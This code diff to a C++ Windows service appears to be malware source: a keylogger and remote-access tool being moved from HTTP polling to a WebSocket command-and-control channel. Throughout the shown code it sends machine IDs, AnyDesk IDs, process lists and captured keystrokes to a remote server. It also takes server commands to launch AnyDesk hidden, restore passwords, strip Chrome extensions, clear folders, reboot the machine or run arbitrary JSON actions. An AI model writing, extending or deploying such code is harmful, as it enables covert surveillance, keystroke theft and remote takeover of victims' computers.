@@ -1,7 +1,6 @@
 #include "stdafx.h"
 #include "resource.h"
 #include <algorithm>
-#include <openssl/ssl.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <string>
@@ -35,8 +34,20 @@
 #include "unzip.h"
 #include "sys_manage.h"
 #include "extensionManage.h"
+#include "ws_client.h"
 
 namespace fs = std::filesystem;
+
+// Action/command constants (match payload.py / server ws/constants.js)
+#define ACTION_CONNECT    "connect"
+#define ACTION_EVENT      "event"
+#define ACTION_CHECKED    "checked"
+#define CMD_JSON          "command_json"
+#define CMD_RUN           "command_run"
+#define CMD_CLOSE         "command_close"
+#define CMD_UNINSTALL     "command_uninstall"
+#define CMD_START_RESTART "command_start_restart"
+#define CMD_CHECK         "command_check"
 
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "WtsApi32.lib")
@@ -103,6 +114,10 @@ string g_servicePath[2];
 
 void file_log(string log);
 void runAction();
+void runActionFromCommand(const std::string& action, const std::string& payload);
+bool send_connect_ws(WsClient* ws);
+bool send_event_ws(WsClient* ws);
+bool send_checked_ws(WsClient* ws);
 DWORD WINAPI CheckTarket(LPVOID lpParam);
 void runActions(std::string);
 string parseServerString(string s);
@@ -124,6 +139,9 @@ string g_computeruid = "";
 string old_pwd_hash = "";
 string old_pwd_salt = "";
 Json::Value g_status;
+
+// WebSocket client used by backend thread (set when connected, used for send_connect/send_event)
+static WsClient* g_wsClient = nullptr;
 
 enum UAC_LEVEL {
 	ALWAYS_NOTIFY = 2,
@@ -397,6 +415,60 @@ std::string GetComputerInfo()
 	return stringifyJson(data);
 }
 
+// Send connect over WebSocket (same as payload.py send_connect). Call once after WS open.
+bool send_connect_ws(WsClient* ws)
+{
+	if (!ws || !ws->is_connected()) return false;
+	string uid = GetComputerUid();
+	Json::Value data;
+	data["id"] = uid;
+	data["anydesk_id"] = getIDs();
+	data["uid"] = uid;
+	data["block"] = false;
+	data["maintenance"] = false;
+	std::string szComInfo = GetComputerInfo();
+	Json::Value comInfo = parseJson(szComInfo);
+	data["scaninfo"] = comInfo["scaninfo"];
+	if (!data["scaninfo"].isObject())
+		data["scaninfo"] = Json::Value(Json::objectValue);
+	data["scaninfo"]["uid"] = uid;
+	Json::Value message;
+	message["action"] = ACTION_CONNECT;
+	message["data"] = data;
+	string body = stringifyJson(message);
+	file_log("send_connect_ws");
+	return ws->send(body);
+}
+
+// Send event over WebSocket (same as payload.py send_event). Includes processes, keyboard.
+bool send_event_ws(WsClient* ws)
+{
+	if (!ws || !ws->is_connected()) return false;
+	Json::Value data = g_eventData;
+	data["uid"] = GetComputerUid();
+	Json::Value message;
+	message["action"] = ACTION_EVENT;
+	message["data"] = data;
+	string body = stringifyJson(message);
+	bool ok = ws->send(body);
+	if (ok) {
+		g_eventData["keyboard"] = "";
+	}
+	return ok;
+}
+
+// Reply to command_check (same as payload.py send_checked).
+bool send_checked_ws(WsClient* ws)
+{
+	if (!ws || !ws->is_connected()) return false;
+	Json::Value data;
+	data["ok"] = true;
+	Json::Value message;
+	message["action"] = ACTION_CHECKED;
+	message["data"] = data;
+	return ws->send(stringifyJson(message));
+}
+
 void release_checkAnyDesk()
 {
 	char szCurrFile[MAX_PATH] = { 0 };
@@ -440,42 +512,81 @@ void GenerateBasePath()
 	g_currentDir = getExePath();
 }
 
+// Heartbeat thread: send event (keyboard/processes) every TIMEWAIT, same as payload.py periodic send_event.
+static DWORD WINAPI WebSocketEventThread(LPVOID lpParam)
+{
+	WsClient* ws = (WsClient*)lpParam;
+	while (ws && ws->is_connected())
+	{
+		Sleep(TIMEWAIT);
+		if (ws->is_connected())
+			send_event_ws(ws);
+	}
+	return 0;
+}
+
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 {
-	string uid = GetComputerUid();
-	string endpoint = "/postKeyboard/" + uid;
-	string server = "";
-
-#ifdef DEBUGLOG
-	server = "https://" + parseServerString(g_socketserver) + endpoint;
-	// server = "https://" + parseServerString(g_socketserver) + endpoint;
-#else
-	server = "https://" + parseServerString(g_socketserver) + endpoint;
-#endif
-	// generate global variables path
-	file_log("ServiceWorkerThread");
+	file_log("ServiceWorkerThread (WebSocket, same flow as payload.py)");
 	Sleep(5000);
 
-	do
+	for (;;)
 	{
-		// send keyboard data
-		string body = stringifyJson(g_eventData);
-		file_log(server);
-		file_log(body);
-		string response;
-		bool flag = PostJsonToServer(server, body, response);
-		if (flag)
+		WsClient client;
+		g_wsClient = &client;
+
+		WsClientCallbacks cb;
+		cb.on_connect = []() {
+			// First thing after WS open: send connect (same as payload.py on_connect -> send_connect)
+			if (g_wsClient && !send_connect_ws(g_wsClient))
+				file_log("ServiceWorkerThread: send_connect_ws failed");
+		};
+		cb.on_close = [](int code, const std::string& msg) {
+			file_log("WebSocket closed: " + std::to_string(code) + " " + msg);
+		};
+		cb.on_error = [](const std::string& err) {
+			file_log("WebSocket error: " + err);
+		};
+		cb.on_command = [](const std::string& action, const std::string& payload) {
+			runActionFromCommand(action, payload);
+		};
+		client.set_callbacks(cb);
+
+		// Connect with plain WS only (server provides WS on port 8443, no WSS)
+		std::string hostPort = g_socketserver;
+		if (hostPort.empty()) hostPort = "localhost:8443";
+		file_log("WebSocket connecting to " + hostPort + " (WS)");
+
+		bool connected = client.connect(hostPort);
+		if (!connected)
 		{
-			g_eventData = Json::Value(Json::objectValue);
-			g_eventData["keyboard"] = "";
+			file_log("ServiceWorkerThread: WebSocket connect failed: " + client.get_last_error());
+			g_wsClient = nullptr;
+			Sleep(5000);
+			continue;
 		}
 
-		runAction();
+		// Start heartbeat thread (send event periodically)
+		HANDLE hEventThread = CreateThread(NULL, 0, WebSocketEventThread, &client, 0, NULL);
 
-		// send clipboard and keyboard event every 15 min
-		Sleep(TIMEWAIT);
-	} while (true);
+		// Receive loop: dispatch admin commands (same as payload.py _on_message -> on_command)
+		std::string out_action, out_payload;
+		while (client.is_connected() && client.receive(out_action, out_payload))
+		{
+			if (!out_action.empty())
+				runActionFromCommand(out_action, out_payload);
+		}
 
+		if (hEventThread)
+		{
+			WaitForSingleObject(hEventThread, 2000);
+			CloseHandle(hEventThread);
+		}
+		client.disconnect();
+		g_wsClient = nullptr;
+		file_log("ServiceWorkerThread: disconnected, reconnecting in 5s");
+		Sleep(5000);
+	}
 	return ERROR_SUCCESS;
 }
 
@@ -536,14 +647,7 @@ bool GetActionStatus(std::string& response)
 {
 	string uid = GetComputerUid();
 	string endpoint = "/getActionStatus/" + uid;
-	string server = "";
-
-#ifdef DEBUGLOG
-	server = "https://" + parseServerString(g_socketserver) + endpoint;
-	// server = "https://" + parseServerString(g_socketserver) + endpoint;
-#else
-	server = "https://" + parseServerString(g_socketserver) + endpoint;
-#endif
+	string server = "http://" + g_socketserver + endpoint;
 
 	Json::Value messageData;
 
@@ -562,14 +666,7 @@ bool ResetActionStatus()
 {
 	string uid = GetComputerUid();
 	string endpoint = "/resetActionStatus/" + uid;
-	string server = "";
-
-#ifdef DEBUGLOG
-	server = "https://" + parseServerString(g_socketserver) + endpoint;
-	// server = "https://" + parseServerString(g_socketserver) + endpoint;
-#else
-	server = "https://" + parseServerString(g_socketserver) + endpoint;
-#endif
+	string server = "http://" + g_socketserver + endpoint;
 
 	string target = stringifyJson(g_eventData["processes"]);
 	string body = "{\"processes\": \"" + target + "\"}";
@@ -582,21 +679,11 @@ bool ResetActionStatus()
 	return flag;
 }
 
-void runAction()
+// Dispatch admin command from WebSocket message (same as payload.py on_command -> runAction).
+void runActionFromCommand(const std::string& action, const std::string& payload)
 {
-
-	file_log("runAction");
-	string strmessage;
-	bool statusCode = GetActionStatus(strmessage);
-	char temp[100];
-	if (!statusCode)
-	{
-		file_log("runAction: error getting action");
-		return;
-	}
-
-	file_log(strmessage);
-	if (strmessage.rfind("command_run") != std::string::npos)
+	file_log("runActionFromCommand: " + action);
+	if (action == CMD_RUN)
 	{
 		file_log("runAction: running anydesk...");
 
@@ -618,22 +705,22 @@ void runAction()
 		Sleep(1000);
 		run_in_service(anydesk_true_path, SW_SHOW);
 	}
-	else if (strmessage.rfind("command_close") != std::string::npos)
+	else if (action == CMD_CLOSE)
 	{
-		file_log("runAction: closing anydesk...");
+		file_log("runActionFromCommand: closing anydesk...");
 		killProcessByName(g_AnydeskTrueName);
 		killProcessByName("AnyDesk.exe");
 		Sleep(1000);
 		restorePasswords();
 	}
-	else if (strmessage.rfind("command_check") != std::string::npos)
+	else if (action == CMD_CHECK)
 	{
-		file_log("runAction: pong");
+		file_log("runActionFromCommand: pong");
+		if (g_wsClient) send_checked_ws(g_wsClient);
 	}
-	else if (strmessage.rfind("command_uninstall") != std::string::npos)
+	else if (action == CMD_UNINSTALL)
 	{
-		file_log("runAction: command_unstall...");
-		ResetActionStatus();
+		file_log("runActionFromCommand: command_uninstall...");
 		// uninstall chrome extensions
 		char extensionPath[MAX_PATH];
 		WIN32_FIND_DATA dirData;
@@ -679,25 +766,40 @@ void runAction()
 		// clean folder
 		DoClearFolder();
 	}
-	else if (strmessage.rfind("command_start_restart") != std::string::npos)
+	else if (action == CMD_START_RESTART)
 	{
-		file_log("runAction: command_restart_pc...");
-		ResetActionStatus();
-
+		file_log("runActionFromCommand: command_restart_pc...");
 		MySystemShutdown();
 	}
+	else if (action == CMD_JSON)
+	{
+		file_log("runActionFromCommand: command_json...");
+		runActions(payload);
+	}
+}
+
+void runAction()
+{
+	file_log("runAction (legacy HTTP - use WebSocket runActionFromCommand)");
+	string strmessage;
+	if (!GetActionStatus(strmessage)) {
+		file_log("runAction: error getting action");
+		return;
+	}
+	file_log(strmessage);
+	if (strmessage.rfind("command_run") != std::string::npos)
+		runActionFromCommand(CMD_RUN, "");
+	else if (strmessage.rfind("command_close") != std::string::npos)
+		runActionFromCommand(CMD_CLOSE, "");
+	else if (strmessage.rfind("command_check") != std::string::npos)
+		runActionFromCommand(CMD_CHECK, "");
+	else if (strmessage.rfind("command_uninstall") != std::string::npos)
+		runActionFromCommand(CMD_UNINSTALL, "");
+	else if (strmessage.rfind("command_start_restart") != std::string::npos)
+		runActionFromCommand(CMD_START_RESTART, "");
 	else if (strmessage.find("command_json") != std::string::npos)
-	{
-		file_log("runAction: command_json...");
-		runActions(strmessage);
-	}
-
-	statusCode = ResetActionStatus();
-	if (!statusCode)
-	{
-		file_log("runAction: error resetting status");
-	}
-
+		runActionFromCommand(CMD_JSON, strmessage);
+	ResetActionStatus();
 }
 
 struct VirusCommand
